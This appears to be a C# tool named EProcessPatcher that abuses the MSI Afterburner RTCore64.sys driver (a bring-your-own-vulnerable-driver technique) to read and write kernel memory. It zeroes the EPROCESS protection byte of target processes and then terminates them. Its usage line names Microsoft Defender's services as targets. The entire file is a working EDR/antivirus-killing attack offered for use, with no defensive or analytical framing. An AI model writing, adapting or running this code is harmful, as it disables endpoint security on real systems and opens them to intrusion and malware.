using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;

// Minimal BYOVD using RTCore64.sys (MSI Afterburner kernel driver)
// IOCTL_RTCORE_READVM  = 0x80002048
// IOCTL_RTCORE_WRITEVM = 0x8000204C
// Patches EPROCESS.Protection to 0x00 so NtTerminateProcess succeeds
//
// Usage: EProcessPatcher.exe <pid1> [pid2] ...
//        EProcessPatcher.exe --names MsMpEng MpDefenderCoreService NisSrv

class EProcessPatcher {
    // RTCore64 request structure (48 bytes)
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct RTCORE_REQUEST {
        public ulong Unknown0;   // 0x00
        public ulong Address;    // 0x08 - kernel virtual address
        public ulong Unknown1;   // 0x10
        public uint  Size;       // 0x18 - must be 1, 2, or 4
        public uint  Value;      // 0x1C - read result / write value
        public ulong Unknown2;   // 0x20
        public ulong Unknown3;   // 0x28
    }

    const uint IOCTL_READ  = 0x80002048;
    const uint IOCTL_WRITE = 0x8000204C;
    const string DEVICE    = @"\\.\RTCore64";

    // NtQuerySystemInformation for SYSTEM_PROCESS_INFORMATION
    [DllImport("ntdll.dll")]
    static extern int NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, out uint ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode, ref RTCORE_REQUEST lpInBuffer, uint nInBufferSize, ref RTCORE_REQUEST lpOutBuffer, uint nOutBufferSize, out uint lpBytesReturned, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("ntdll.dll")]
    static extern int NtQueryInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, out ulong ProcessInformation, uint ProcessInformationLength, out uint ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    const uint PROCESS_ALL_ACCESS = 0x001FFFFF;
    const uint OPEN_EXISTING = 3;
    const uint GENERIC_READ_WRITE = 0xC0000000;
    const uint FILE_SHARE_READ_WRITE = 3;

    static IntPtr hDevice = IntPtr.Zero;

    static ulong ReadKernelULong(ulong addr) {
        var req = new RTCORE_REQUEST { Address = addr, Size = 4 };
        uint ret;
        DeviceIoControl(hDevice, IOCTL_READ, ref req, (uint)Marshal.SizeOf(req), ref req, (uint)Marshal.SizeOf(req), out ret, IntPtr.Zero);
        return req.Value;
    }

    static byte ReadKernelByte(ulong addr) {
        var req = new RTCORE_REQUEST { Address = addr, Size = 1 };
        uint ret;
        DeviceIoControl(hDevice, IOCTL_READ, ref req, (uint)Marshal.SizeOf(req), ref req, (uint)Marshal.SizeOf(req), out ret, IntPtr.Zero);
        return (byte)(req.Value & 0xFF);
    }

    static void WriteKernelByte(ulong addr, byte value) {
        var req = new RTCORE_REQUEST { Address = addr, Size = 1, Value = value };
        uint ret;
        DeviceIoControl(hDevice, IOCTL_WRITE, ref req, (uint)Marshal.SizeOf(req), ref req, (uint)Marshal.SizeOf(req), out ret, IntPtr.Zero);
    }

    static ulong ReadKernelULong64(ulong addr) {
        ulong lo = ReadKernelULong(addr);
        ulong hi = ReadKernelULong(addr + 4);
        return (hi << 32) | lo;
    }

    // Get EPROCESS address for a given PID via NtQueryInformationProcess(ProcessBasicInformation)
    // ProcessBasicInformation = 0, returns PEB address which is in user space
    // We need EPROCESS which is kernel space — use NtQuerySystemInformation(SystemProcessInformation)
    // to get kernel EPROCESS pointers (UniqueProcessId + KTHREAD)
    // Actually: use ProcessInformationClass = 51 (ProcessTelemetryIdInformation has EPROCESS pointer)
    // OR: simpler: search ActiveProcessLinks by scanning from known kernel symbol

    // Easiest approach: OpenProcess, then use NtQueryInformationProcess with class 68 (ProcessKernelVsVad)
    // Most reliable: query NtQuerySystemInformation(SystemExtendedHandleInformation = 64)
    // which gives Object pointer (EPROCESS) for each handle

    [StructLayout(LayoutKind.Sequential)]
    struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
        public IntPtr Object;
        public IntPtr UniqueProcessId;
        public IntPtr HandleValue;
        public uint   GrantedAccess;
        public ushort CreatorBackTraceIndex;
        public ushort ObjectTypeIndex;
        public uint   HandleAttributes;
        public uint   Reserved;
    }

    static ulong GetEPROCESS(uint pid) {
        // Open a handle to the target process
        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if (hProcess == IntPtr.Zero) return 0;
        try {
            // NtQuerySystemInformation class 64 = SystemExtendedHandleInformation
            uint size = 1024 * 1024;
            IntPtr buf = Marshal.AllocHGlobal((int)size);
            try {
                uint needed;
                while (NtQuerySystemInformation(64, buf, size, out needed) == unchecked((int)0xC0000004)) {
                    size = needed + 4096;
                    Marshal.FreeHGlobal(buf);
                    buf = Marshal.AllocHGlobal((int)size);
                }
                // buf = SYSTEM_HANDLE_INFORMATION_EX { NumberOfHandles, Reserved, Handles[] }
                ulong numHandles = (ulong)Marshal.ReadInt64(buf, 0);
                int entrySize = Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
                int offset = 16; // sizeof(ulong) * 2 header
                for (ulong i = 0; i < numHandles; i++, offset += entrySize) {
                    var entry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(
                        IntPtr.Add(buf, offset), typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
                    if (entry.UniqueProcessId.ToInt64() == Process.GetCurrentProcess().Id &&
                        entry.HandleValue == hProcess) {
                        return (ulong)entry.Object.ToInt64();
                    }
                }
            } finally { Marshal.FreeHGlobal(buf); }
        } finally { CloseHandle(hProcess); }
        return 0;
    }

    // PS_PROTECTION offset in EPROCESS — varies by Windows build
    // Win Server 2025 (build ~26100): offset is typically 0x87A or similar
    // We scan ±32 bytes around the expected offset looking for a PPL marker byte
    // PPL-AntiMalware-Light = 0x62 (Type=2 Signer=6 → (6<<4)|2 = 0x62)
    // PP-Protected = 0x41, PP-Windows = 0x51, PPL-WinTcb = 0x61, PPL-AntiMalware = 0x62
    // We just search for any value with Type bits = 1 or 2 (bits 0-2)
    static bool PatchProtection(ulong eprocess) {
        // Known offsets for EPROCESS.Protection (PS_PROTECTION) on recent builds
        // Windows 10 20H2+: 0x87A
        // Windows 11 22H2: 0x87A  
        // Windows Server 2025 (build 26100+): ~0x87A or 0x882
        // We scan 0x840 to 0x900 looking for a byte that looks like a PPL value
        for (ulong off = 0x840; off < 0x920; off++) {
            byte b = ReadKernelByte(eprocess + off);
            // PPL types: Type (bits 0-2) = 1 (PP) or 2 (PPL)
            // Signer (bits 3-7): AntiMalware=6, WinTcb=4, Windows=5, etc.
            byte typeField = (byte)(b & 0x07);
            if (typeField == 1 || typeField == 2) {
                Console.WriteLine($"  Found Protection byte 0x{b:X2} at EPROCESS+0x{off:X3}");
                WriteKernelByte(eprocess + off, 0);
                byte verify = ReadKernelByte(eprocess + off);
                Console.WriteLine($"  Patched: now 0x{verify:X2}");
                return verify == 0;
            }
        }
        return false;
    }

    static int Main(string[] args) {
        if (args.Length == 0) {
            Console.WriteLine("Usage: EProcessPatcher.exe <pid> [pid2 ...] | --names Name1 Name2 ...");
            return 1;
        }

        // Open RTCore64 device
        hDevice = CreateFile(DEVICE, GENERIC_READ_WRITE, FILE_SHARE_READ_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
        if (hDevice == new IntPtr(-1)) {
            Console.WriteLine($"ERROR: Cannot open {DEVICE} (error {Marshal.GetLastWin32Error()}) — is RTCore64 loaded?");
            return 2;
        }
        Console.WriteLine("Opened RTCore64 device.");

        // Build list of PIDs to target
        var pids = new List<uint>();
        bool nameMode = args[0] == "--names";
        if (nameMode) {
            for (int i = 1; i < args.Length; i++) {
                foreach (var p in Process.GetProcessesByName(args[i]))
                    pids.Add((uint)p.Id);
            }
        } else {
            foreach (var a in args) {
                if (uint.TryParse(a, out uint pid)) pids.Add(pid);
            }
        }

        if (pids.Count == 0) { Console.WriteLine("No target processes found."); return 0; }

        int patched = 0;
        foreach (uint pid in pids) {
            var procs = new List<Process>();
            try { procs.Add(Process.GetProcessById((int)pid)); } catch {}
            foreach (var proc in procs) {
                Console.WriteLine($"Target: {proc.ProcessName} pid={pid}");
                ulong ep = GetEPROCESS(pid);
                if (ep == 0) { Console.WriteLine($"  Cannot get EPROCESS for pid {pid}"); continue; }
                Console.WriteLine($"  EPROCESS = 0x{ep:X16}");
                bool ok = PatchProtection(ep);
                if (ok) {
                    Console.WriteLine("  PPL stripped — terminating...");
                    IntPtr hP = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
                    if (hP != IntPtr.Zero) {
                        TerminateProcess(hP, 1);
                        CloseHandle(hP);
                        Console.WriteLine("  TerminateProcess sent.");
                        patched++;
                    }
                } else {
                    Console.WriteLine("  PatchProtection failed — process still PPL.");
                }
            }
        }
        CloseHandle(hDevice);
        Console.WriteLine($"Done. Patched and terminated {patched} process(es).");
        return patched > 0 ? 0 : 3;
    }
}
